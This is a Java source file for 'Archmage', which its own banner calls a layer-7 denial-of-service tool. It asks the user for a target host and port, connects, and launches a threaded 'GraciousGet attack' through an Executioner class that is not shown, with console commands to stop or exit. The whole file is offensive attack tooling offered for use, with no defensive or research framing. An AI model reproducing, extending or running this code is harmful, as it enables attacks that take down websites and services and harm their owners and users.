package m3rlin;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

import m3rlin.utils.Logger;

public class Archmage {

	private static final String STOP_ATTACK = "STOP";
	private static final String EXIT_ARCHMAGE = "EXIT";

	Executioner executioner;
	
	private Socket socket;
	private Scanner console;
	private String host;
	private int port;
	
	public void start() {
		try {				
			console = new Scanner(System.in);
			Logger.console("\n>> Establishing connection to " + host + ":" + port + "...");
			socket = new Socket(host, port);
			Logger.console("\n>> Connection established...");
			Logger.console("\n>> Begninning GraciousGet attack...\n\n");
			executioner = new Executioner(host, port);
			executioner.start();
			while (executioner.isRunning()) {
				if(console.hasNextLine()) {
					String input = console.nextLine();
					if (input != null && input.length() > 0) {
						if (input.equalsIgnoreCase(STOP_ATTACK)) {
							stop();
						} else if (input.equalsIgnoreCase(EXIT_ARCHMAGE)) {
							exit();
						}
					} else {
						Logger.info("Attack threads: " + executioner.getActiveCount());
						Logger.info("Completed threads: " + executioner.getCompletedTaskCount());
					}
				}
			}
		} catch (UnknownHostException e) {			
			Logger.console("\n>> Could not locate the host; try another, or check again later (UnknownHostException)\n");			
		} catch (ConnectException e) {		
			Logger.console("\n>> Could not connect to the socket address; try another port, or start checking for firewall issues (ConnectException)\n");			
		} catch (IllegalArgumentException e) {			
			Logger.console("\n>> Port out of range; try another (IllegalArgumentException)\n");
		} catch (IOException e) {
			Logger.console("\n>> Badness while acquiring socket connection (IOException)\n");
		}
		init();
		start();
	}
	
	public void stop() throws IOException {
		Logger.console("\n>> Stopping attack...");
		executioner.stop();
		socket.close();
		Logger.console("\n>> Attack stopped...\n");
	}
	
	public void exit() throws IOException {
		stop();
		Logger.console("\n>> Exiting...");
		System.exit(0);
	}
	
	public void init() {
		console = new Scanner(System.in);
		Logger.console("\nEnter target (IP or host): ");
		host = console.nextLine();
		try {
			Logger.console("Enter port (Default: 80): ");
			String portStr = console.nextLine();
			if (portStr == null || portStr.length() == 0) {
				port = 80;
			} else {
				port = Integer.parseInt(portStr);
			}
		} catch (NumberFormatException e) {		
			Logger.console("\n>> Port numbers can't contain non-numeric characters\n");
			init();
		}		
	}
	
	public static void main(String[] args) {
		Logger.console("+-------------------+\n");
		Logger.console("| Archmage (L7 DoS) |\n");
		Logger.console("+-------------------+\n");
		Archmage archmage;
		while (true) {
			archmage = new Archmage();
			archmage.init();
			archmage.start();	
		}
	}
}